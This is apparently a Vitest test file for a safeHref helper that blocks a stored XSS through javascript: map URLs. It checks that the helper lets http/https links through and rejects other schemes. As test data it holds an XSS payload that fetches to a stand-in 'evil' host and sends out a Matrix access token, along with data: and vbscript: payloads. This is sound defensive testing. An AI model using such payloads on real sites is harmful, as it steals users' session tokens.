// #87 — stored XSS via javascript: URL in google_maps_url rendered as href.
// safeHref must return null for any scheme outside http/https/mailto so the
// renderer falls back to a non-link.
import { describe, expect, it } from 'vitest';
import { safeHref } from '../safeHref.js';

describe('safeHref (#87)', () => {
  it('passes ordinary https maps URLs through', () => {
    expect(safeHref('https://maps.app.goo.gl/abc123')).toBe('https://maps.app.goo.gl/abc123');
    expect(safeHref('http://maps.google.com/?q=1,2')).toBe('http://maps.google.com/?q=1,2');
  });

  it('rejects javascript: URLs (the stored-XSS payload)', () => {
    expect(safeHref("javascript:fetch('//evil/?t='+sessionStorage['matrix.access_token'])")).toBeNull();
    expect(safeHref('  JavaScript:alert(1)')).toBeNull();
  });

  it('rejects data: and vbscript: schemes', () => {
    expect(safeHref('data:text/html,<script>1</script>')).toBeNull();
    expect(safeHref('vbscript:msgbox(1)')).toBeNull();
  });

  it('handles empty / non-string input', () => {
    expect(safeHref(null)).toBeNull();
    expect(safeHref(undefined)).toBeNull();
    expect(safeHref('')).toBeNull();
    expect(safeHref(42)).toBeNull();
  });
});
